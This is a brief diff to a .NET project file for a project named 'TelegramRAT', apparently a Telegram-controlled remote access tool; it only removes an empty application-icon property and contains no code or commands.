@@ -3,7 +3,6 @@
 	<PropertyGroup>
 		<OutputType>Exe</OutputType>
 		<RootNamespace>TelegramRAT</RootNamespace>
-		<ApplicationIcon></ApplicationIcon>
 		<StartupObject>TelegramRAT.Program</StartupObject>
 		<Version>2.5.2</Version>
 		<NeutralLanguage>en</NeutralLanguage>
